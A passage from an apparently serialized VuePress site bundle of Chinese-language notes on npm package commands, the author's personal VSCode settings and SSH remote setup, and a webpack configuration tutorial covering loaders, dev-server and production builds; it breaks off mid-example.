package-lock.json是什么\n\npackage-lock.json是在npm 5版本时引入的，为了解决“同一项目不同机器上安装的软件包不一致”的问题。引入后用以保证安装的每个包都有确切版本，可以百分百一致复制到另一台机器上。\n\npackage-lock.json 会固化当前安装的每个软件包的版本，npm install时，npm 会使用这些确切的版本，npm update时，会更新package-lock.json文件中软件包的版本。\n\n\n# 查看包的版本\n\n查看本地安装的包的版本：\n\n * npm list：查看局部安装的所有包（包括它们的软件包）的版本。\n * npm list -g：查看全局安装的所有包（包括它们的软件包）的版本。\n * npm list --depth=0：查看局部顶层的软件包，也就是 package.json 中列出的软件包的版本。\n * npm list -g --depth 0：查看全局安装的软件包。\n * npm list xxx：查看xxx软件包安装的版本。\n\n查看远程仓库上包的版本：\n\n * npm view xxx version：查看xxx软件包在npm远程仓库上最新可用的版本。\n * npm view xxx versions：查看xxx软件包在npm远程仓库上以前的旧版本\n * npm outdated：查看package.json中列出的软件包在本地和远程的版本信息，列出了一个表进行对比。\n   \n\n\n# 安装旧版本的包\n\n在安装命令的包名后加@再加版本号，例如：npm install cowsay@1.2.0\n\n全局的软件包也可以：npm install -g webpack@4.16.4\n\n\n# 更新包\n\nsemver表示法设置要升级到的版本，例如：\n\n * 〜1.13.0：只更新补丁版本，可以更新到1.13.1，但1.14.0不行；主要用于修复bug。\n * ^1.13.0：更新补丁版本和次版本，可以更新到1.13.1、1.14.0等；修改的东西要向下兼容。\n * 1.13.0：不更新，一直使用这个版本。\n * >1.13.0：大于这个版本的任何版本都可以；>=、<=、<、||同理。\n * 1.13.0 - 1.15.0：这个范围内的任何版本都可以。\n\n说明：1.13.0，1是主版本（不兼容），13是次版本（向下兼容），0是补丁版本（修复bug）。\n\n使用npm update来更新所有软件包，使用npm update xxx来更新单个软件包。\n\n有些软件包的主版本使用npm update更新不了，因为可能会引入较大的更改。要强制更新到最新可以使用npm install -g npm-check-updates和ncu -u，再去npm update。\n\n\n# 卸载包\n\n这个很简单，在“安装包”的命令上将install改为uninstall即可。\n\n\n# 发布包\n\n发布npm publish，撤销发布npm unpublish <package>@<version>",charsets:{cjk:!0}},{title:"VSCode的使用",frontmatter:{},regularPath:"/book-web/%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7/VSCode%E7%9A%84%E4%BD%BF%E7%94%A8.html",relativePath:"book-web/常用工具/VSCode的使用.md",key:"v-4187e536",path:"/book-web/%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7/VSCode%E7%9A%84%E4%BD%BF%E7%94%A8.html",headers:[{level:2,title:"强力推荐Settings Sync插件",slug:"强力推荐settings-sync插件",normalizedTitle:"强力推荐settings sync插件",charIndex:16},{level:2,title:"基础配置",slug:"基础配置",normalizedTitle:"基础配置",charIndex:190},{level:2,title:"Git在VSCode中的配置",slug:"git在vscode中的配置",normalizedTitle:"git在vscode中的配置",charIndex:1483},{level:2,title:"VSCode中使用Markdown",slug:"vscode中使用markdown",normalizedTitle:"vscode中使用markdown",charIndex:1801},{level:2,title:"Remote Development插件",slug:"remote-development插件",normalizedTitle:"remote development插件",charIndex:2594}],lastUpdated:"7/6/2022, 3:41:21 PM",lastUpdatedTimestamp:1657093281e3,headersStr:"强力推荐Settings Sync插件 基础配置 Git在VSCode中的配置 VSCode中使用Markdown Remote Development插件",content:'# VSCode的使用\n\n\n# 强力推荐Settings Sync插件\n\nSettings Sync插件教程，这个插件可以同步VSCode里所有的配置，包括你安装的插件，在一台新电脑里安装VSCode，只要我们使用“Settings Sync插件”就可以将以前旧电脑里的VSCode所有配置同步过来。具体怎么使用可以点链接进去学习，下面的章节是我个人的VSCode配置。\n\n\n# 基础配置\n\n * Auto Save：自动保存，设置的是off，可与Auto Save Delay一起使用。\n * Auto Save Delay：在多少毫秒后自动保存。\n * Tab Size：默认是4，但如果Editor:Detect Indentation启用时，它可能会被覆盖；同样的Insert Spaces也一样。\n * Auto Closing Brackets：自动补全右括号；这个我不喜欢使用，置为了never。\n * Auto Closing Quotes：自动补全右引号；这个我不喜欢使用，置为了never。\n * Column Seletcion：使用鼠标和键进行行列的选择，例如：选择一些行的首部信息，将它们粘贴在其他行的首部。\n * Hover:Enabled：是否进行悬浮提示\n * Hover:Delay：悬停提示前的等待时间。\n * Hover:Sticky：悬浮提示展示时，鼠标移动到它上面是否显示。\n * editor.formatOnSave：保存时自动格式化，开启了。\n * editor.minimap.enabled：是否显示缩略图，我不喜欢使用这个。\n * editor.suggest.statusBar.visible：建议小部件底部的状态栏，开启了。\n * Eol：行尾字符，LF是Unix系统的，CRLF是Windows系统的，我在设置Git时是统一的LF，这里同样选用LF，理由可以看Git的使用那一节。\n * workbench.commandPalette.preserveInput：再次打开命令面板时，是否恢复上一次的输入内容，有兴趣的可以开启。\n * workbench.tree.indent：文件树缩进大小，由8改为了6，其实也随意了。\n * workbench.tree.renderIndentGuides：文件树缩进参考线的显示，置为了always。\n * workbench.view.alwaysShowHeaderActions：操作区域的一些按钮是否总是显示，开启了。\n * terminal.integrated.automationShell.windows：在下面有介绍。\n * css.lint.duplicateProperties：不要使用重复的样式定义，置为warning。\n * update.mode：值置为none，禁止更新。\n * update.enableWindowsBackgroundUpdates：关闭了，不启用在windows后台更新vscode\n * extensions.autoCheckUpdates：自动检查扩展更新，关闭了\n * extensions.autoUpdate：自动安装扩展更新，关闭了\n * typescript.enablePromptUseWorkspaceTsdk：开启了\n * typescript.tsdk: ""\n * typescript.updateImportsOnFileMove.enabled：always\n\n\n# Git在VSCode中的配置\n\n * terminal.integrated.automationShell.windows：将windows命令行换成Git Bash，在settings.json中编辑，例如："terminal.integrated.shell.windows": "D:/Git/bin/bash.exe"\n * git.path: "D:/Git/bin/git.exe"\n * git.showPushSuccessNotification：Git推送成功后显示通知，开启了。\n * git.supportCancellation：同步操作时出现通知，可以取消，开启了。\n * 安装GitLens插件\n\n\n# VSCode中使用Markdown\n\n * 安装“Markdown All in One”、“Markdown Preview Enhanced”和“markdownlint”这三个插件\n\n * Markdown教程\n\n * Markdown Preview Enhanced的使用\n\n * Markdown All in One的使用\n\n * markdownlint规则\n   \n   "markdownlint.config": {\n       "default": true, // 允许某个规则中几项可以使用\n         "MD033": {\n             "allowed_elements": [\n                 "details",\n                 "summary",\n                 "a",\n                 "ul",\n                 "li",\n                 "br",\n                 "code",\n                 "pre",\n             ]\n         },\n         "MD041": false,\n   }\n   \n   \n   1\n   2\n   3\n   4\n   5\n   6\n   7\n   8\n   9\n   10\n   11\n   12\n   13\n   14\n   15\n   16\n   \n\n * markdown-preview-enhanced.enableHTML5Embed：允许将多媒体链接转换成H5标签。\n\n * Toggle Break On Single Newline：开启了，无需再打两个空格然后回车进行换行。\n\n\n# Remote Development插件\n\n * 可以不用Remote Development插件，直接用XShell或者FinalShell等工具。\n\n * 在VSCODE扩展商店里安装“Remote Development插件”，左侧会出现一个新图标（类似我的电脑），点击它。\n\n * 再点击齿轮形状的设置按钮，选择C:\\Users\\Administrator\\.ssh\\config，然后在里面配置好连接信息\n   \n   Host 阿里云\n     HostName 47.102.155.125\n     User root\n   \n   \n   1\n   2\n   3\n   \n\n * 配置好这个连接信息后，左侧列表就会出现刚刚配置的target，右击这个target，我们选择在新窗口进行ssh连接。\n\n * 如果出现An SSH installation couldn’t be found错误，表示没有找到ssh连接工具，我们打开VSCODE的设置，搜索remote.SSH.path，将Git的ssh工具的路径填进去，例如D:\\Git\\usr\\bin\\ssh.exe。（我们并没有使用 Windows OpenSSH 客户端）\n\n * 如果出现could not establish connection to错误，首先点“重试”按钮。如果不行，很有可能是选择的服务器类型不对，我们打开VSCODE的设置，搜索remote.SSH.remotePlatform，如果阿里云ecs是linux的，我们就对应选择linux的，记得要确认保存。（还有一种原因是密码没输，直接回车了。然后还可以尝试删除C:\\Users\\Administrator\\.ssh\\known_hosts文件）\n\n * 至于The authenticity of host xxx can\'t be established问题，可以暂时忽略，它在第一次连接远程服务器会出现。\n\n * 如何才算连接成功了？点开那个新窗口的Remote Development图标，如果target有个绿色的勾就表示连接成功了。如果还能操作远程服务器能更加表明连接成功了。\n\n * 连接成功后，有两种方式操作远程服务器。\n   \n   1. 在“终端”里点击“+”，也就是新建一个终端窗口，这个新的终端窗口就是一个远程终端，用来操作阿里云服务器的。\n   2. 直接使用VSCODE的“文件-打开文件夹”来操作远程服务器里的文件夹，因为此时的VSCODE窗口相当于远程服务器的可视化工具了。这种方式更方便，可以看下面第二张图打开后的目录结构。\n      \n\n * 如果还有问题，可以查看解决无法连接实例问题。',normalizedContent:'# vscode的使用\n\n\n# 强力推荐settings sync插件\n\nsettings sync插件教程，这个插件可以同步vscode里所有的配置，包括你安装的插件，在一台新电脑里安装vscode，只要我们使用“settings sync插件”就可以将以前旧电脑里的vscode所有配置同步过来。具体怎么使用可以点链接进去学习，下面的章节是我个人的vscode配置。\n\n\n# 基础配置\n\n * auto save：自动保存，设置的是off，可与auto save delay一起使用。\n * auto save delay：在多少毫秒后自动保存。\n * tab size：默认是4，但如果editor:detect indentation启用时，它可能会被覆盖；同样的insert spaces也一样。\n * auto closing brackets：自动补全右括号；这个我不喜欢使用，置为了never。\n * auto closing quotes：自动补全右引号；这个我不喜欢使用，置为了never。\n * column seletcion：使用鼠标和键进行行列的选择，例如：选择一些行的首部信息，将它们粘贴在其他行的首部。\n * hover:enabled：是否进行悬浮提示\n * hover:delay：悬停提示前的等待时间。\n * hover:sticky：悬浮提示展示时，鼠标移动到它上面是否显示。\n * editor.formatonsave：保存时自动格式化，开启了。\n * editor.minimap.enabled：是否显示缩略图，我不喜欢使用这个。\n * editor.suggest.statusbar.visible：建议小部件底部的状态栏，开启了。\n * eol：行尾字符，lf是unix系统的，crlf是windows系统的，我在设置git时是统一的lf，这里同样选用lf，理由可以看git的使用那一节。\n * workbench.commandpalette.preserveinput：再次打开命令面板时，是否恢复上一次的输入内容，有兴趣的可以开启。\n * workbench.tree.indent：文件树缩进大小，由8改为了6，其实也随意了。\n * workbench.tree.renderindentguides：文件树缩进参考线的显示，置为了always。\n * workbench.view.alwaysshowheaderactions：操作区域的一些按钮是否总是显示，开启了。\n * terminal.integrated.automationshell.windows：在下面有介绍。\n * css.lint.duplicateproperties：不要使用重复的样式定义，置为warning。\n * update.mode：值置为none，禁止更新。\n * update.enablewindowsbackgroundupdates：关闭了，不启用在windows后台更新vscode\n * extensions.autocheckupdates：自动检查扩展更新，关闭了\n * extensions.autoupdate：自动安装扩展更新，关闭了\n * typescript.enablepromptuseworkspacetsdk：开启了\n * typescript.tsdk: ""\n * typescript.updateimportsonfilemove.enabled：always\n\n\n# git在vscode中的配置\n\n * terminal.integrated.automationshell.windows：将windows命令行换成git bash，在settings.json中编辑，例如："terminal.integrated.shell.windows": "d:/git/bin/bash.exe"\n * git.path: "d:/git/bin/git.exe"\n * git.showpushsuccessnotification：git推送成功后显示通知，开启了。\n * git.supportcancellation：同步操作时出现通知，可以取消，开启了。\n * 安装gitlens插件\n\n\n# vscode中使用markdown\n\n * 安装“markdown all in one”、“markdown preview enhanced”和“markdownlint”这三个插件\n\n * markdown教程\n\n * markdown preview enhanced的使用\n\n * markdown all in one的使用\n\n * markdownlint规则\n   \n   "markdownlint.config": {\n       "default": true, // 允许某个规则中几项可以使用\n         "md033": {\n             "allowed_elements": [\n                 "details",\n                 "summary",\n                 "a",\n                 "ul",\n                 "li",\n                 "br",\n                 "code",\n                 "pre",\n             ]\n         },\n         "md041": false,\n   }\n   \n   \n   1\n   2\n   3\n   4\n   5\n   6\n   7\n   8\n   9\n   10\n   11\n   12\n   13\n   14\n   15\n   16\n   \n\n * markdown-preview-enhanced.enablehtml5embed：允许将多媒体链接转换成h5标签。\n\n * toggle break on single newline：开启了，无需再打两个空格然后回车进行换行。\n\n\n# remote development插件\n\n * 可以不用remote development插件，直接用xshell或者finalshell等工具。\n\n * 在vscode扩展商店里安装“remote development插件”，左侧会出现一个新图标（类似我的电脑），点击它。\n\n * 再点击齿轮形状的设置按钮，选择c:\\users\\administrator\\.ssh\\config，然后在里面配置好连接信息\n   \n   host 阿里云\n     hostname 47.102.155.125\n     user root\n   \n   \n   1\n   2\n   3\n   \n\n * 配置好这个连接信息后，左侧列表就会出现刚刚配置的target，右击这个target，我们选择在新窗口进行ssh连接。\n\n * 如果出现an ssh installation couldn’t be found错误，表示没有找到ssh连接工具，我们打开vscode的设置，搜索remote.ssh.path，将git的ssh工具的路径填进去，例如d:\\git\\usr\\bin\\ssh.exe。（我们并没有使用 windows openssh 客户端）\n\n * 如果出现could not establish connection to错误，首先点“重试”按钮。如果不行，很有可能是选择的服务器类型不对，我们打开vscode的设置，搜索remote.ssh.remoteplatform，如果阿里云ecs是linux的，我们就对应选择linux的，记得要确认保存。（还有一种原因是密码没输，直接回车了。然后还可以尝试删除c:\\users\\administrator\\.ssh\\known_hosts文件）\n\n * 至于the authenticity of host xxx can\'t be established问题，可以暂时忽略，它在第一次连接远程服务器会出现。\n\n * 如何才算连接成功了？点开那个新窗口的remote development图标，如果target有个绿色的勾就表示连接成功了。如果还能操作远程服务器能更加表明连接成功了。\n\n * 连接成功后，有两种方式操作远程服务器。\n   \n   1. 在“终端”里点击“+”，也就是新建一个终端窗口，这个新的终端窗口就是一个远程终端，用来操作阿里云服务器的。\n   2. 直接使用vscode的“文件-打开文件夹”来操作远程服务器里的文件夹，因为此时的vscode窗口相当于远程服务器的可视化工具了。这种方式更方便，可以看下面第二张图打开后的目录结构。\n      \n\n * 如果还有问题，可以查看解决无法连接实例问题。',charsets:{cjk:!0}},{title:"webpack的使用",frontmatter:{},regularPath:"/book-web/%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7/webpack%E7%9A%84%E4%BD%BF%E7%94%A8.html",relativePath:"book-web/常用工具/webpack的使用.md",key:"v-0e9188c2",path:"/book-web/%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7/webpack%E7%9A%84%E4%BD%BF%E7%94%A8.html",headers:[{level:2,title:"什么是webpack",slug:"什么是webpack",normalizedTitle:"什么是webpack",charIndex:59},{level:2,title:"安装使用",slug:"安装使用",normalizedTitle:"安装使用",charIndex:210},{level:2,title:"入口entry",slug:"入口entry",normalizedTitle:"入口entry",charIndex:457},{level:2,title:"出口output",slug:"出口output",normalizedTitle:"出口output",charIndex:1412},{level:2,title:"模式mode",slug:"模式mode",normalizedTitle:"模式mode",charIndex:1989},{level:2,title:"转换loader",slug:"转换loader",normalizedTitle:"转换loader",charIndex:3272},{level:2,title:"webpack-dev-server",slug:"webpack-dev-server",normalizedTitle:"webpack-dev-server",charIndex:7807},{level:2,title:"树摇tree shaking",slug:"树摇tree-shaking",normalizedTitle:"树摇tree shaking",charIndex:8551},{level:2,title:"生产环境构建",slug:"生产环境构建",normalizedTitle:"生产环境构建",charIndex:9028},{level:2,title:"代码分离和缓存",slug:"代码分离和缓存",normalizedTitle:"代码分离和缓存",charIndex:11916},{level:2,title:"处理全局变量和函数",slug:"处理全局变量和函数",normalizedTitle:"处理全局变量和函数",charIndex:13308},{level:2,title:"离线程序",slug:"离线程序",normalizedTitle:"离线程序",charIndex:14076},{level:2,title:"公共路径",slug:"公共路径",normalizedTitle:"公共路径",charIndex:14921},{level:2,title:"一些报错",slug:"一些报错",normalizedTitle:"一些报错",charIndex:15527}],lastUpdated:"7/6/2022, 3:41:21 PM",lastUpdatedTimestamp:1657093281e3,headersStr:"什么是webpack 安装使用 入口entry 出口output 模式mode 转换loader webpack-dev-server 树摇tree shaking 生产环境构建 代码分离和缓存 处理全局变量和函数 离线程序 公共路径 一些报错",content:"# webpack的使用\n\n官方文档：https://www.webpackjs.com/concepts/\n\n\n# 什么是webpack\n\nwebpack是js应用程序的静态模块打包器(module bundler)。它会将应用程序的资源文件当成一个个模块，根据模块之间的依赖关系递归处理它们，构建一个依赖关系图(dependency graph)，最后将应用程序需要的每个模块打包成一个或多个bundle。\n\n\n# 安装使用\n\n 1. 下载并安装Node.js，然后在命令行工具里输入npm init来创建package.json，在之前的Npm的使用有讲过。\n 2. 输入npm install --save-dev webpack@<version>来局部安装webpack。\n 3. 继续输入npm install --save-dev webpack-cli来局部安装webpack的命令工具。\n 4. 新建webpack.config.js配置文件，这个就是项目中webpack的关键所在。\n\n\n# 入口entry\n\n入口entry：webpack构建的起点入口，会从这里递归处理它所有依赖的模块并开始打包。\n\n 1. 单入口写法：\n    \n    const config = {\n        entry: {\n            main: './src/Main.ts'\n        }\n    };\n    // 上面的简写\n    const config1 = {\n        entry: './src/Main.ts'\n    };\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    \n\n 2. 数组形式的多入口写法：\n    \n    const config = {\n        entry: ['./src/Main.ts', './test/Test.ts']\n    };\n    \n    \n    1\n    2\n    3\n    \n\n 3. 对象形式的多入口写法：\n    \n    // 分离 应用程序(app) 和 第三方库(vendor) 入口\n    const config = {\n        entry: {\n            app: './src/app.js',\n            vendors: './src/vendors.js'\n        }\n    };\n    // 多页面应用程序\n    const config1 = {\n        entry: {\n            pageOne: './src/pageOne/index.js',\n            pageTwo: './src/pageTwo/index.js',\n            pageThree: './src/pageThree/index.js'\n        }\n    };\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    13\n    14\n    15\n    \n\n\n# 出口output\n\n出口output：指定webpack最后将打包好的文件存放在哪里，并怎么命名。\n\nconst config = {\n  output: {\n    filename: 'bundle.js',              // 打包文件的命名\n    path: '/home/proj/public/assets'    // 存放地址\n  }\n};\n\n\n1\n2\n3\n4\n5\n6\n\n\n多入口对应的出口处理：\n\nconst config = {\n  entry: {\n    app: './src/app.js',\n    search: './src/search.js'\n  },\n  output: {\n    filename: '[name].js',      // 使用占位符(substitutions)来确保每个文件具有唯一的名称\n    path: __dirname + '/dist'   // __dirname是当前webpack.config.js所在的路径，拼接上dist\n  }\n};                              // 更高级的拼接是path.join，或者使用path.resolve将后面的参数处理成目标路径\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n\n# 模式mode\n\n模式mode：为webpack提供模式配置的优化，有两个值development和production\n\n设置为development或production都会创建一个全局变量process.env.NODE_ENV，用于区分应用程序的环境是开发环境还是生产环境。\n\n设置为development，会启用NamedChunksPlugin和NamedModulesPlugin。NamedChunksPlugin的作用就是给每个chunks进行命名，方便开发人员来查找打包后的文件；NamedModulesPlugin也是类似的作用，会给某个打包的模块进行命名，有一个独一无二的key方便开发人员调试。\n\nmodule.exports = {\n+ mode: 'development'\n- plugins: [\n-   new webpack.NamedModulesPlugin(),   // 对打包后的模块进行命名\n-   new webpack.NamedChunksPlugin(),    // 对打包后的chunks进行命名\n-   new webpack.DefinePlugin({ \"process.env.NODE_ENV\": JSON.stringify(\"development\") }), // 添加全局变量NODE_ENV\n- ]\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n设置为production，会启用FlagDependencyUsagePlugin（标记没有用到的依赖）, FlagIncludedChunksPlugin（给当前chunk包含的chunkid加入chunk名之中）, ModuleConcatenationPlugin（作用域提升，打包成闭包，达到预编译的目的）, NoEmitOnErrorsPlugin（忽略错误信息，将其他正确的信息正确输出到output）, OccurrenceOrderPlugin（按照调用次数来给chunks排序）, SideEffectsFlagPlugin（如果当前的模块没有被引用，而且package.json中的sideEffects为false，那么打包的时候就可以将此模块剔除） 和 UglifyJsPlugin（混淆压缩）。\n\nmodule.exports = {\n+  mode: 'production',\n-  plugins: [\n-    new UglifyJsPlugin(/* ... */),\n-    new webpack.DefinePlugin({ \"process.env.NODE_ENV\": JSON.stringify(\"production\") }),\n-    new webpack.optimize.ModuleConcatenationPlugin(),\n-    new webpack.NoEmitOnErrorsPlugin()\n-  ]\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n\n# 转换loader\n\n转换loader：使用webpack对模块源代码进行转换，可以将所有类型的文件转换为webpack能够处理的有效模块。\n\n 1. css loader\n    安装 style-loader 和 css-loader，npm install --save-dev style-loader css-loader\n    配置：在webpack.config.js文件里配置module中的rules，use: ['style-loader', 'css-loader']\n    注意：use属性里style-loader要放在css-loader前\n    \n     {\n        test: /\\.css$/, // test属性用于标识出应该被对应的loader进行转换的某个或某些文件\n        use: ['style-loader', 'css-loader'] // use属性表示进行转换时应该使用的哪个loader\n     }\n    \n    \n    1\n    2\n    3\n    4\n    \n\n 2. less loader\n    安装 less-loader 和 less，npm install --save-dev less-loader less\n    配置：在webpack.config.js文件里配置module中的rules，use: ['style-loader', 'css-loader', 'less-loader']\n    \n     {\n         test: /\\.less$/,\n         use: ['style-loder', 'css-loader', 'less-loader']\n     }\n    \n    \n    1\n    2\n    3\n    4\n    \n\n 3. sass loader\n    安装 sass-loader 和 node-sass，npm install --save-dev sass-loader node-sass\n    配置：在webpack.config.js文件里配置module中的rules，use: ['style-loader', 'css-loader', 'sass-loader']\n    注意：还可以写成use: [{loader: 'style-loader'}, {loader: 'css-loader'}, {loader: 'sass-loader'}]\n\n 4. postcss loader 自动加上浏览器前缀\n    安装postcss-loader和autoprefixer，npm install --save-dev postcss-loader autoprefixer\n    配置：在webpack.config.js文件里配置module中的rules\n    \n     {\n         test: /\\.scss$/,\n         use: ['style-loader', 'css-loader', 'sass-loader', {\n             loader: \"postcss-loader\",   // 添加浏览器前缀，压缩 CSS\n             options: {\n                 plugins: [\n                     require(\"autoprefixer\")\n                     ({\n                         browsers: [\n                             'ie >= 8', // ie版本大于等于ie8\n                             'Firefox >= 20', // 火狐浏览器大于20版本\n                             'Safari >= 5', // safari大于5版本\n                             'Android >= 4', // 安卓版本大于4\n                             'Ios >= 6', // ios版本大于ios6\n                             'last 4 version' // 浏览器最新的四个版本\n                         ]\n                     })\n                 ]\n             }\n         }]\n     }\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    13\n    14\n    15\n    16\n    17\n    18\n    19\n    20\n    21\n    \n\n 5. file loader 文件处理 安装 file-loader，npm install --save-dev file-loader 选项配置： name:为你的文件配置自定义文件名模板(默认[hash].[ext]) context:配置自定义文件的上下文，默认为webpack.config.js所在的位置 publicPath:为你的文件配置自定义public发布目录 outputPath:为你的文件配置自定义output输出目录 [ext]:资源扩展名 [name]:资源的基本名称 [path]:资源相对于context的路径 [hash]:内容的哈希值\n    \n     {\n         test: /\\.(png|jpg|gif|jpeg|svg)$/,\n         use: [{\n             loader: 'file-loader',\n             options: {\n                 name: '[path]xxx.jpg', // path是该图片实际的位置（相对于上下文）\n                 context: '../', // 指定上下文\n                 publicPath: 'https://www.abc.com/img', // 用于cdn\n                 outputPath: './img', // 直接打包生成在bin/img目录下了而不是bin/[path]了\n                 name: '[hash]xxx.jpg' // hash值\n             }\n         }]\n     }, {\n         test: /\\.(ttf|woff|woff2|eot)$/,\n         use: [{\n             loader: 'file-loader',\n             options: {\n                 outputPath: './font'\n             }\n         }]\n     }\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    13\n    14\n    15\n    16\n    17\n    18\n    19\n    20\n    21\n    \n\n 6. babel loader es6转es5 安装 babel-loader(负责es6语法转换)、babel-core(babel核心包)、babel-preset-env(告诉babel使用哪种转码规则进行 文件处理)，npm install babel-loader @babel/core @babel/preset-env --save-dev\n    \n     {\n         test: /\\.js$/,\n         exclude: /node_modules/, // 或者include: path.resolve(__dirname, \"src/js\"),指定位置提高构建效率\n         use: [{\n             loader: 'babel_loader',\n             options: {\n                 preset: ['@babel/preset-env']\n             }\n         }]\n     }\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    \n\n 7. ts loader 安装 typescript、ts-loader，npm install --save-dev typescript ts-loader。\n    \n     {\n         test: /\\.tsx?$/,\n         use: 'ts-loader',\n         exclude: /node_modules/\n     }\n    \n    \n    1\n    2\n    3\n    4\n    5\n    \n    \n    其实ts的使用还要配置tsconfig.json，其中target设置为“es5”意思是编译到es5，还有sourceMap改为true，再配合webpack的devtool: 'inline-source-map'就可以在开发环境上调试了。\n\n 8. csv xml loader 安装 csv-loader、xml-loader，npm install --save-dev csv-loader xml-loader\n    \n     {\n         test: /\\.(csv|tsv)$/,\n         use: [\n             'csv-loader'\n         ]\n     },{\n         test: /\\.xml$/,\n         use: [\n            'xml-loader'\n         ]\n     }\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    \n\n\n# webpack-dev-server\n\nwebpack-dev-server用来配置本地服务器的，使用它可以为webpack打包生成的资源文件提供web服务，还有自动刷新和热替换(HMR)。\n\n安装webpack-dev-server使用的是npm install --save-dev webpack-dev-server。\n\n在webpack.config.js写上devServer配置\n\ndevServer: {\n    contentBase: path.join(__dirname, \"bin\"), // 设置服务器访问的基本目录\n    host: 'localhost', // 服务器的ip地址\n    port: 8080, // 端口号\n    open: true, // webpack运行服务器时自动打开页面\n    hot: true // 热更新开关\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n在package.json的scripts里添加配置\n\n\"scripts\": {\n    \"webpack-dev-server\": \"webpack-dev-server --mode development\"\n}\n\n\n1\n2\n3\n\n\n在开启热更新后（只能开发环境使用），还要在插件中添加 NamedModulesPlugin 和 HotModuleReplacementPlugin 插件，以便更容易查看要修补(patch)的依赖。\n\nplugins: [\n    new webpack.NamedModulesPlugin(),\n    new webpack.HotModuleReplacementPlugin()\n]\n\n\n1\n2\n3\n4\n\n\n\n# 树摇tree shaking\n\n树摇tree shaking：代码中有一些未被引用的模块，webpack可以在打包过程中将其剔除，就像将树上枯萎的叶子摇落下来。使用它的原因就是生产打包后的代码包体会减小，对于项目的优化比较重要。\n\n在 package.json 里设置sideEffects: false会告知webpack可以放心安全地删除未用到的export导出，但是项目确实有一些这样未使用的模块但又不想删除它，那就是可以将sideEffects设置为一个数组：\n\n\"sideEffects\": [\n    \"./src/some-side-effectful-file.js\"\n]\n\n\n1\n2\n3\n\n\n当然，在 webpack.config.js 里也能设置可以存在的未使用模块，在打包后不会被删除：\n\nmodule.rules: [\n  {\n    include: path.resolve(\"node_modules\", \"lodash\"),\n    sideEffects: false\n  }\n]\n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# 生产环境构建\n\n生产环境不同于开发环境，它需要的bundle要小、source map要轻量还有更优化的资源，那么建议单独为生产环境配置一个config，或者说将项目的webpack配置分为“通用”、“开发”和“生产”三种，然后使用 webpack-merge 工具将其合并。\n\n安装 webpack-merge，npm install --save-dev webpack-merge，然后创建webpack.common.js、webpack.dev.js和webpack.prod.js三个文件。最后还要修改package.json，而且require进来的插件也要安装一下。\n\npackage.json：\n\n\"scripts\": {\n    \"serve\": \"webpack-dev-server --open --config webpack.dev.js --mode development\",\n    \"build:dev\": \"webpack --open --config webpack.dev.js --mode development\",\n    \"build:pro\": \"webpack --config webpack.prod.js --mode production\",\n},\n\n\n1\n2\n3\n4\n5\n\n\nwebpack.common.js：\n\nconst path = require('path');\nconst { CleanWebpackPlugin } = require('clean-webpack-plugin');\nconst HtmlWebpackPlugin = require('html-webpack-plugin');\n\nmodule.exports = {\n    entry: { app: './src/index.js' }, // 入口\n    output: {\n        filename: '[name].bundle.js', // 出口的文件名，[name]就是入口中使用的名字\n        path: path.resolve(__dirname, 'dist') // 处理输出位置\n    },\n    module: {\n        rules: [{ // 使用tsloader\n            test: /\\.tsx?$/,\n            use: 'ts-loader',\n            exclude: /node_modules/\n        }]\n    },\n    resolve: {\n        extensions: ['.tsx', '.ts', '.js']\n    },\n    plugins: [\n        new CleanWebpackPlugin({ // 打包生成dist前会自动删除dist下的文件，使用npm脚本“rm -rf ./dist”也可以\n            cleanOnceBeforeBuildPatterns: ['dist']\n        }),\n        new HtmlWebpackPlugin({ // 用于生成入口html（存于dist），然后会自动引入打包好的bundle.js\n            title: 'Production',\n            template: './index.html' // 模板，webpack生成html时用到的模板，比如模板里要挂载vue。\n        })\n    ]\n};\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n\n\nwebpack.dev.js：\n\nconst path = require('path');\nconst { merge } = require('webpack-merge');\nconst common = require('./webpack.common.js');\n\nmodule.exports = merge(common, {\n    devtool: 'inline-source-map',   // 开发环境所使用的SourceMap\n    devServer: { // webpack-dev-server\n        contentBase: path.resolve(__dirname, 'dist'), // 设置服务器访问的基本目录\n        host: 'localhost', // 服务器的ip地址\n        port: 8080, // 端口号\n        open: true // webpack运行服务器时自动打开页面\n    }\n});\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\nwebpack.prod.js：\n\nconst webpack = require('webpack');\nconst merge = require('webpack-merge');\nconst UglifyJSPlugin = require('uglifyjs-webpack-plugin');\nconst common = require('./webpack.common.js');\n\nmodule.exports = merge(common, {\n    devtool: 'source-map', // 用于生产的SourceMap\n    plugins: [\n        // 代码混淆压缩，当然你也可以考虑使用BabelMinifyWebpackPlugin或ClosureCompilerPlugin\n        new UglifyJSPlugin({\n            sourceMap: true // 用于生产的SourceMap\n        }),\n        // 为项目设置环境变量，指定环境为生产环境，打包出的bundle会小很多。\n        // 也可以在package.json里加上--env.NODE_ENV=production，但是得把env传到webpack.prod.js里来，将对象改为函数\n        new webpack.DefinePlugin({\n            'process.env.NODE_ENV': JSON.stringify('production')\n        })\n    ]\n  });\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\n\n# 代码分离和缓存\n\n代码分离：因为入口 chunks 之间可能包含重复的模块，并会被加载到不同的bundle里，那么就得对重复的模块从原有的文件中分离出来。\n\nplugins: [\n    new 